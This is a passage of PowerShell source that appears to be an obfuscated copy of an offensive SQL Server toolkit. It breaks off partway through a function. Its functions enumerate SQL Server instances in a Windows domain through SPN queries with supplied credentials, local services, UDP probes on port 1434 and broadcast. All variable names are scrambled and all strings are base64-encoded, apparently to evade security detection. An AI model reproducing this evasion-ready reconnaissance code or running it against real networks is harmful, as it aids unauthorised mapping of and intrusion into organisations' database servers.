Function  Get-SQLInstanceDomain
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Performs UDP scan of servers managing SQL Server clusters.')]
        [switch]$CheckMgmt,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Preforms a DNS lookup on the instance.')]
        [switch]$IncludeIP,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 3
    )
    Begin
    {
        ${/=\/=\__/=\___/==} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQQBjAGMAbwB1AG4AdABTAGkAZAA='))))
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQQBjAGMAbwB1AG4AdAA='))))
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQQBjAGMAbwB1AG4AdABDAG4A'))))
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))))
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG4A'))))
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
        $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        if($IncludeIP)
        {
            $null = ${/=\/=\__/=\___/==}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))))
        }
    }
    Process
    {
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAGEAYgBiAGkAbgBnACAAUwBQAE4AcwAgAGYAcgBvAG0AIAB0AGgAZQAgAGQAbwBtAGEAaQBuACAAZgBvAHIAIABTAFEATAAgAFMAZQByAHYAZQByAHMAIAAoAE0AUwBTAFEATAAqACkALgAuAC4A')))
        ${/=\/\______/\____} = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFMAUQBMACoA'))) -SuppressVerbose | ? -FilterScript {
            $_.service -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFMAUQBMACoA')))
        }
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBpAG4AZwAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAcwAgAGYAcgBvAG0AIABTAFAATgBzAC4ALgAuAA==')))
        ${/=\/\______/\____} |
        % -Process {
            ${__/==\/\/=\/\/=\/} = $_.Spn
            $Instance = ${__/==\/\/=\/\/=\/}.split('/')[1].split(':')[1]
            ${__/=\_/\/\_/=\__/} = 0
            if([int32]::TryParse($Instance,[ref]${__/=\_/\/\_/=\__/}))
            {
                ${/=\_/\/==\__/==\_} = ${__/==\/\/=\/\/=\/} -replace ':', ','
            }
            else
            {
                ${/=\_/\/==\__/==\_} = ${__/==\/\/=\/\/=\/} -replace ':', '\'
            }
            ${/=\_/\/==\__/==\_} = ${/=\_/\/==\__/==\_} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFMAUQBMAFMAdgBjAC8A'))), ''
            ${___/\/\__/=====\/} = @([string]$_.ComputerName,
                [string]${/=\_/\/==\__/==\_},
                $_.UserSid,
                [string]$_.User,
                [string]$_.Usercn,
                [string]$_.Service,
                [string]$_.Spn,
                $_.LastLogon,
                [string]$_.Description)
            if($IncludeIP)
            {
                try 
                {
                    $IPAddress = [Net.DNS]::GetHostAddresses([String]$_.ComputerName).IPAddressToString
                    if($IPAddress -is [Object[]])
                    {
                        $IPAddress = $IPAddress -join ", "
                    }
                }
                catch 
                {
                    $IPAddress = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAuADAALgAwAC4AMAA=')))
                }
                ${___/\/\__/=====\/} += $IPAddress
            }
            $null = ${/=\/=\__/=\___/==}.Rows.Add(${___/\/\__/=====\/})
        }
        if($CheckMgmt)
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAGEAYgBiAGkAbgBnACAAUwBQAE4AcwAgAGYAcgBvAG0AIAB0AGgAZQAgAGQAbwBtAGEAaQBuACAAZgBvAHIAIABTAGUAcgB2AGUAcgBzACAAbQBhAG4AYQBnAGkAbgBnACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGMAbAB1AHMAdABlAHIAcwAgACgATQBTAFMAZQByAHYAZQByAEMAbAB1AHMAdABlAHIATQBnAG0AdABBAFAASQApAC4ALgAuAA==')))
            ${/===\___/\/\/=\/\} = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential  -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFMAZQByAHYAZQByAEMAbAB1AHMAdABlAHIATQBnAG0AdABBAFAASQA='))) -SuppressVerbose |
            ? -FilterScript {
                $_.ComputerName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuACoA')))
            } |
            select -Property ComputerName -Unique |
            sort -Property ComputerName
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAZgBvAHIAbQBpAG4AZwAgAGEAIABVAEQAUAAgAHMAYwBhAG4AIABvAGYAIABtAGEAbgBhAGcAZQBtAGUAbgB0ACAAcwBlAHIAdgBlAHIAcwAgAHQAbwAgAG8AYgB0AGEAaQBuACAAbQBhAG4AYQBnAGUAZAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAcwAuAC4ALgA=')))
            ${/====\_/\__/\_/==} = ${/===\___/\/\/=\/\} |
            select -Property ComputerName -Unique |
            Get-SQLInstanceScanUDP -UDPTimeOut $UDPTimeOut
        }
    }
    End
    {
        if($CheckMgmt)
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBpAG4AZwAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAFUARABQACAAcwBjAGEAbgAuAC4ALgA=')))
            ${_/====\_/=====\/\} = ${/====\_/\__/\_/==} |
            select -Property ComputerName, Instance |
            sort -Property ComputerName, Instance
            ${/=\/==\_/====\__/} = ${/=\/=\__/=\___/==} |
            select -Property ComputerName, Instance |
            sort -Property ComputerName, Instance
            ${/===\__/====\_/\/} = ${_/====\_/=====\/\} + ${/=\/==\_/====\__/}
            ${/==\__/=\_/=\/\_/} = ${/===\__/====\_/\/}.rows.count
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8APQBcAF8ALwA9AFwALwBcAF8ALwB9ACAAaQBuAHMAdABhAG4AYwBlAHMAIAB3AGUAcgBlACAAZgBvAHUAbgBkAC4A')))
            ${/===\__/====\_/\/}
        }
        else
        {
            ${/==\__/=\_/=\/\_/} = ${/=\/=\__/=\___/==}.rows.count
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8APQBcAF8ALwA9AFwALwBcAF8ALwB9ACAAaQBuAHMAdABhAG4AYwBlAHMAIAB3AGUAcgBlACAAZgBvAHUAbgBkAC4A')))
            ${/=\/=\__/=\___/==}
        }
    }
}
Function  Get-SQLInstanceLocal
{
    Begin
    {
        ${________/\___/\_/} = New-Object -TypeName System.Data.DataTable
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUA'))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AA=='))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))))
    }
    Process
    {
        ${_/==\_/==\_/===\/} = Get-SQLServiceLocal | ? -FilterScript {
            $_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))
        }
        ${_/==\_/==\_/===\/} |
        % -Process {
            $ComputerName = [string]$_.ComputerName
            ${__/==\/=\/\/\_/=\} = [string]$_.ServiceDisplayName
            if(${__/==\/=\/\/\_/=\})
            {
                $Instance = $ComputerName + '\' +${__/==\/=\/\/\_/=\}.split('(')[1].split(')')[0]
                if($Instance -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcAE0AUwBTAFEATABTAEUAUgBWAEUAUgA='))))
                {
                    $Instance = $ComputerName
                }
            }
            else
            {
                $Instance = $ComputerName
            }
            $null = ${________/\___/\_/}.Rows.Add(
                [string]$_.ComputerName,
                [string]$Instance,
                [string]$_.ServiceDisplayName,
                [string]$_.ServiceName,
                [string]$_.ServicePath,
                [string]$_.ServiceAccount,
            [string]$_.ServiceState)
        }
    }
    End
    {
        ${/==\_/\/=\/\_/\__} = ${________/\___/\_/}.rows.count
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwAvAFwALwA9AFwALwBcAF8ALwBcAF8AXwB9ACAAbABvAGMAYQBsACAAaQBuAHMAdABhAG4AYwBlAHMAIAB3AGgAZQByAGUAIABmAG8AdQBuAGQALgA=')))
        ${________/\___/\_/}
    }
}
function Get-SQLInstanceScanUDP
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\_/===\_/======} = New-Object -TypeName system.Data.DataTable -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGIAbABlAA==')))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAE4AYQBtAGUA'))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIASQBQAA=='))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABDAFAAUABvAHIAdAA='))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBWAGUAcgBzAGkAbwBuAA=='))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAbAB1AHMAdABlAHIAZQBkAA=='))))
    }
    Process
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAC0AIABVAEQAUAAgAFMAYwBhAG4AIABTAHQAYQByAHQALgA=')))
        }
        if ($ComputerName -ne '')
        {
            try
            {
                $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)
                ${_/\/==\___/===\__} = New-Object -TypeName System.Net.Sockets.Udpclient
                ${____/=\_/==\/==\_} = $UDPTimeOut * 1000
                ${_/\/==\___/===\__}.client.ReceiveTimeout = ${____/=\_/==\/==\_}
                ${_/\/==\___/===\__}.Connect($ComputerName,0x59a)
                ${/=\__/=\/=\/\/\_/} = 0x03
                ${_/\__/====\_____/} = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                ${_/\/==\___/===\__}.Client.Blocking = $true
                [void]${_/\/==\___/===\__}.Send(${/=\__/=\/=\/\/\_/},${/=\__/=\/=\/\/\_/}.Length)
                ${__/===\___/==\/=\} = ${_/\/==\___/===\__}.Receive([ref]${_/\__/====\_____/})
                ${/==\/======\_/\_/} = [System.Text.Encoding]::ASCII.GetString(${__/===\___/==\/=\}).split(';')
                ${/==\_/\/=\__/====} = @{}
                for(${_/\_/\/\__/\____/} = 0; ${_/\_/\/\__/\____/} -le ${/==\/======\_/\_/}.length; ${_/\_/\/\__/\____/}++)
                {
                    if(![string]::IsNullOrEmpty(${/==\/======\_/\_/}[${_/\_/\/\__/\____/}]))
                    {
                        ${/==\_/\/=\__/====}.Add((${/==\/======\_/\_/}[${_/\_/\/\__/\____/}].ToLower() -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBcAFcAXQA='))), ''),${/==\/======\_/\_/}[${_/\_/\/\__/\____/}+1])
                    }
                    else
                    {
                        if(![string]::IsNullOrEmpty(${/==\_/\/=\__/====}.'tcp'))
                        {
                            if(-not $SuppressVerbose)
                            {
                                ${___/=========\__/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBcAA==')))+${/==\_/\/=\__/====}.'instancename'
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAC0AIABGAG8AdQBuAGQAOgAgACQAewBfAF8AXwAvAD0APQA9AD0APQA9AD0APQA9AFwAXwBfAC8AfQA=')))
                            }
                            $null = ${_/\_/===\_/======}.rows.Add(
                                [string]$ComputerName,
                                [string]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBcAA==')))+${/==\_/\/=\__/====}.'instancename',
                                [string]${/==\_/\/=\__/====}.'instancename',
                                [string]$IPAddress,
                                [string]${/==\_/\/=\__/====}.'tcp',
                                [string]${/==\_/\/=\__/====}.'version',
                            [string]${/==\_/\/=\__/====}.'isclustered')
                            ${/==\_/\/=\__/====} = @{}
                        }
                    }
                }
                ${_/\/==\___/===\__}.Close()
            }
            catch
            {
            }
        }
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAC0AIABVAEQAUAAgAFMAYwBhAG4AIABDAG8AbQBwAGwAZQB0AGUALgA=')))
        }
    }
    End
    {
        ${_/\_/===\_/======}
    }
}
function Get-SQLInstanceBroadcast 
{
    [CmdletBinding()]
    Param(
            [Parameter(Mandatory = $false,
        HelpMessage = 'This will send a UDP request to each of the identified SQL Server instances to gather more information..')]
        [switch]$UDPPing
    )
    Begin
    {
        ${/=\/\______/\____} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\/\______/\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\/\______/\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\/\______/\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAbAB1AHMAdABlAHIAZQBkAA=='))))
        $null = ${/=\/\______/\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))))        
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGkAZABlAG4AdABpAGYAeQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAcwAgAG8AbgAgAHQAaABlACAAYgByAG8AYQBkAGMAYQBzAHQAIABkAG8AbQBhAGkAbgAuAA==')))
    }
    Process
    {
        try {
            ${_/\_/\/===\/===\/} = [System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()
            ${_/\_/\/===\/===\/} | 
            % {
                [string]${/===\_/\__/=\/\/\} =  $_.InstanceName
                if(${/===\_/\__/=\/\/\}){
                    [string]${/====\__/\/\/\___} = $_.Servername + "\" + $_.InstanceName
                }else{
                    [string]${/====\__/\/\/\___} = $_.Servername 
                }
                [string]$ComputerName = $_.Servername
                [string]${___/==\_/\/\_/\_/}  = $_.IsClustered
                [string]${/=\_/===\/\/\/==\}      = $_.Version
                ${/=\/\______/\____}.Rows.Add($ComputerName, ${/====\__/\/\/\___}, ${___/==\_/\/\_/\_/}, ${/=\_/===\/\/\/==\}) | Out-Null
            }
        }
        catch{
            ${/=\_______/===\__} = $_.Exception.Message
            Write-Host -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABPAHAAZQByAGEAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            Write-Host -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABFAHIAcgBvAHIAOgAgACQAewAvAD0AXABfAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8AfQA=')))     
        }
    }
    End
    {               
        ${/==\__/=\_/=\/\_/} = ${/=\/\______/\____}.Rows.Count
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8APQBcAF8ALwA9AFwALwBcAF8ALwB9ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGkAbgBzAHQAYQBuAGMAZQBzACAAdwBlAHIAZQAgAGYAbwB1AG4AZAAuAA==')))
        if($UDPPing){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAZgBvAHIAbQBpAG4AZwAgAFUARABQACAAcABpAG4AZwAgAGEAZwBhAGkAbgBzAHQAIAAkAHsALwA9AD0AXABfAF8ALwA9AFwAXwAvAD0AXAAvAFwAXwAvAH0AIABTAFEATAAgAFMAZQByAHYAZQByACAAaQBuAHMAdABhAG4AYwBlAHMALgA=')))
            ${/=\/\______/\____} |
            %{
                ${_/\____/\_/\___/=} = $_.ComuterName                
                Get-SQLInstanceScanUDP -ComputerName $_.ComputerName -SuppressVerbose
            }
        }         
        if(-not $UDPPing){
            ${/=\/\______/\____}
        }
    }
}
function Get-SQLInstanceScanUDPThreaded
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\_/===\_/======} = New-Object -TypeName system.Data.DataTable -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGIAbABlAA==')))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAE4AYQBtAGUA'))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIASQBQAA=='))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABDAFAAUABvAHIAdAA='))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBWAGUAcgBzAGkAbwBuAA=='))))
        $null = ${_/\_/===\_/======}.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAbAB1AHMAdABlAHIAZQBkAA=='))))
        ${_/\_/===\_/======}.Clear()
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
            ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
        }
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $ComputerName = $_.ComputerName
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAC0AIABVAEQAUAAgAFMAYwBhAG4AIABTAHQAYQByAHQALgA=')))
            }
            if ($ComputerName -ne '')
            {
                try
                {
                    $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)
                    ${_/\/==\___/===\__} = New-Object -TypeName System.Net.Sockets.Udpclient
                    ${____/=\_/==\/==\_} = $UDPTimeOut * 1000
                    ${_/\/==\___/===\__}.client.ReceiveTimeout = ${____/=\_/==\/==\_}
                    ${_/\/==\___/===\__}.Connect($ComputerName,0x59a)
                    ${/=\__/=\/=\/\/\_/} = 0x03
                    ${_/\__/====\_____/} = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                    ${_/\/==\___/===\__}.Client.Blocking = $true
                    [void]${_/\/==\___/===\__}.Send(${/=\__/=\/=\/\/\_/},${/=\__/=\/=\/\/\_/}.Length)
                    ${__/===\___/==\/=\} = ${_/\/==\___/===\__}.Receive([ref]${_/\__/====\_____/})
                    ${/==\/======\_/\_/} = [System.Text.Encoding]::ASCII.GetString(${__/===\___/==\/=\}).split(';')
                    ${/==\_/\/=\__/====} = @{}
                    for(${_/\_/\/\__/\____/} = 0; ${_/\_/\/\__/\____/} -le ${/==\/======\_/\_/}.length; ${_/\_/\/\__/\____/}++)
                    {
                        if(![string]::IsNullOrEmpty(${/==\/======\_/\_/}[${_/\_/\/\__/\____/}]))
                        {
                            ${/==\_/\/=\__/====}.Add((${/==\/======\_/\_/}[${_/\_/\/\__/\____/}].ToLower() -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBcAFcAXQA='))), ''),${/==\/======\_/\_/}[${_/\_/\/\__/\____/}+1])
                        }
                        else
                        {
                            if(![string]::IsNullOrEmpty(${/==\_/\/=\__/====}.'tcp'))
                            {
                                if(-not $SuppressVerbose)
                                {
                                    ${___/=========\__/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBcAA==')))+${/==\_/\/=\__/====}.'instancename'
                                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAC0AIABGAG8AdQBuAGQAOgAgACQAewBfAF8AXwAvAD0APQA9AD0APQA9AD0APQA9AFwAXwBfAC8AfQA=')))
                                }
                                $null = ${_/\_/===\_/======}.rows.Add(
                                    [string]$ComputerName,
                                    [string]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBcAA==')))+${/==\_/\/=\__/====}.'instancename',
                                    [string]${/==\_/\/=\__/====}.'instancename',
                                    [string]$IPAddress,
                                    [string]${/==\_/\/=\__/====}.'tcp',
                                    [string]${/==\_/\/=\__/====}.'version',
                                [string]${/==\_/\/=\__/====}.'isclustered')
                                ${/==\_/\/=\__/====} = @{}
                            }
                        }
                    }
                    ${_/\/==\___/===\__}.Close()
                }
                catch
                {
                }
            }
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAC0AIABVAEQAUAAgAFMAYwBhAG4AIABFAG4AZAAuAA==')))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${_/\_/===\_/======}
    }
}
Function  Get-SQLInstanceFile
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true,
        HelpMessage = 'The file path.')]
        [string]$FilePath
    )
    Begin
    {
        ${/==\____/\/\/=\/\} = New-Object -TypeName System.Data.DataTable
        $null = ${/==\____/\/\/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/==\____/\/\/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
    }
    Process
    {
        if(Test-Path $FilePath)
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAaQBuAGcAIABpAG4AcwB0AGEAbgBjAGUAcwAgAGYAcgBvAG0AIABmAGkAbABlACAAcABhAHQAaAAuAA==')))
        }
        else
        {
